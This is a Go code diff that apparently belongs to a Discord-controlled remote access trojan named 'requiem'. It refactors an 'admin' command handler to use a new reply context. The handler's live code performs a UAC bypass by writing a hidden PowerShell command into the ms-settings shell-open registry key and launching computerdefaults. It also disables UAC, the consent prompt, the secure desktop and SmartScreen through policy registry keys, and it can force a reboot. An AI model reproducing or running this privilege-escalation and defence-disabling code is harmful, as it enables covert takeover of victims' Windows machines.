@@ -8,21 +8,19 @@ import (
 
 	"requiem/store"
 	"requiem/utils"
-
-	"github.com/bwmarrin/discordgo"
 )
 
 const (
-	MS_SETTINGS       string = "HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command"
-	CURRENT_POLICIES  string = "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"
-	SOFTWARE_POLICIES string = "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System"
+	_MS_SETTINGS       string = "HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command"
+	_CURRENT_POLICIES  string = "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"
+	_SOFTWARE_POLICIES string = "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System"
 )
 
-func (*AdminCommand) Exec(ses *discordgo.Session, msg *discordgo.MessageCreate, args []string) {
+func (*AdminCommand) Exec(ctx *store.CommandContext, args []string) {
 	content := strings.Join(args, " ")
 
 	if utils.HasFlag(content, "check") {
-		ses.ChannelMessageSendReply(msg.ChannelID, fmt.Sprintf("Elevated: %t", store.IsAdmin), msg.Reference())
+		ctx.ReplyMsg(fmt.Sprintf("Elevated: %t", store.IsAdmin))
 		return
 	}
 
@@ -33,16 +31,16 @@ func (*AdminCommand) Exec(ses *discordgo.Session, msg *discordgo.MessageCreate, 
 	// 	if !elevated {
 	// 		utils.CheckMutex()
 
-	// 		ses.ChannelMessageSendReply(msg.ChannelID, "🟥 User did not accept the UAC prompt.", msg.Reference())
+	// 		ctx.ReplyMsg("🟥 User did not accept the UAC prompt.")
 	// 		return
 	// 	}
 
-	// 	ses.ChannelMessageSendReply(msg.ChannelID, "🟩 UAC prompt accepted, restarting...", msg.Reference())
+	// 	ctx.ReplyMsg("🟩 UAC prompt accepted, restarting...")
 	// 	return
 	// }
 
 	if utils.HasFlag(content, "bypass") {
-		ses.ChannelMessageSendReply(msg.ChannelID, "Attempting to elevate...", msg.Reference())
+		ctx.ReplyMsg("Attempting to elevate...")
 
 		command := fmt.Sprintf(
 			"powershell -nop -w hidden -ep bypass -c \"& '%s' %s %d\"",
@@ -53,26 +51,26 @@ func (*AdminCommand) Exec(ses *discordgo.Session, msg *discordgo.MessageCreate, 
 
 		err := utils.RunCommand(
 			"reg", "add",
-			MS_SETTINGS,
+			_MS_SETTINGS,
 			"/ve", "/d", command,
 			"/f",
 		)
 
 		if err != nil {
-			ses.ChannelMessageSendReply(msg.ChannelID, fmt.Sprintf("🟥 Failed to create registry key (1) - %s", err), msg.Reference())
+			ctx.ReplyMsg(fmt.Sprintf("🟥 Failed to create registry key (1) - %s", err))
 			return
 		}
 
 		err = utils.RunCommand(
 			"reg", "add",
-			MS_SETTINGS,
+			_MS_SETTINGS,
 			"/v", "DelegateExecute",
 			"/d", "",
 			"/f",
 		)
 
 		if err != nil {
-			ses.ChannelMessageSendReply(msg.ChannelID, fmt.Sprintf("🟥 Failed to create registry key (2) - %s", err), msg.Reference())
+			ctx.ReplyMsg(fmt.Sprintf("🟥 Failed to create registry key (2) - %s", err))
 			return
 		}
 
@@ -81,7 +79,7 @@ func (*AdminCommand) Exec(ses *discordgo.Session, msg *discordgo.MessageCreate, 
 
 		err = utils.RunCommand("cmd", "/c", "start computerdefaults")
 		if err != nil {
-			ses.ChannelMessageSendReply(msg.ChannelID, fmt.Sprintf("🟥 Failed to run - %s", err), msg.Reference())
+			ctx.ReplyMsg(fmt.Sprintf("🟥 Failed to run - %s", err))
 			return
 		}
 
@@ -98,7 +96,7 @@ func (*AdminCommand) Exec(ses *discordgo.Session, msg *discordgo.MessageCreate, 
 
 	if utils.HasFlag(content, "disable") {
 		if !store.IsAdmin {
-			ses.ChannelMessageSendReply(msg.ChannelID, "🟥 Administrator privileges are required to do this.", msg.Reference())
+			ctx.ReplyMsg("🟥 Administrator privileges are required to do this.")
 			return
 		}
 
@@ -112,7 +110,7 @@ func (*AdminCommand) Exec(ses *discordgo.Session, msg *discordgo.MessageCreate, 
 		)
 
 		if err != nil {
-			ses.ChannelMessageSendReply(msg.ChannelID, fmt.Sprintf("🟥 Failed to disable limited user account - %s", err), msg.Reference())
+			ctx.ReplyMsg(fmt.Sprintf("🟥 Failed to disable limited user account - %s", err))
 		}
 
 		err = utils.RunCommand(
@@ -125,7 +123,7 @@ func (*AdminCommand) Exec(ses *discordgo.Session, msg *discordgo.MessageCreate, 
 		)
 
 		if err != nil {
-			ses.ChannelMessageSendReply(msg.ChannelID, fmt.Sprintf("🟥 Failed to disable consent prompt - %s", err), msg.Reference())
+			ctx.ReplyMsg(fmt.Sprintf("🟥 Failed to disable consent prompt - %s", err))
 		}
 
 		err = utils.RunCommand(
@@ -138,7 +136,7 @@ func (*AdminCommand) Exec(ses *discordgo.Session, msg *discordgo.MessageCreate, 
 		)
 
 		if err != nil {
-			ses.ChannelMessageSendReply(msg.ChannelID, fmt.Sprintf("🟥 Failed to disable secure prompt - %s", err), msg.Reference())
+			ctx.ReplyMsg(fmt.Sprintf("🟥 Failed to disable secure prompt - %s", err))
 		}
 
 		err = utils.RunCommand(
@@ -151,10 +149,10 @@ func (*AdminCommand) Exec(ses *discordgo.Session, msg *discordgo.MessageCreate, 
 		)
 
 		if err != nil {
-			ses.ChannelMessageSendReply(msg.ChannelID, fmt.Sprintf("🟥 Failed to disable smart screen - %s", err), msg.Reference())
+			ctx.ReplyMsg(fmt.Sprintf("🟥 Failed to disable smart screen - %s", err))
 		}
 
-		ses.ChannelMessageSendReply(msg.ChannelID, "🟩 Successfully disabled UAC related settings.", msg.Reference())
+		ctx.ReplyMsg("🟩 Successfully disabled UAC related settings.")
 
 		if utils.HasFlag(content, "force") {
 			utils.RunCommand("shutdown", "/r", "/f", "/t", "0")
@@ -163,7 +161,7 @@ func (*AdminCommand) Exec(ses *discordgo.Session, msg *discordgo.MessageCreate, 
 		return
 	}
 
-	ses.ChannelMessageSendReply(msg.ChannelID, "🟥 Invalid flag.", msg.Reference())
+	ctx.ReplyMsg("🟥 Invalid flag.")
 }
 
 func (*AdminCommand) Name() string {
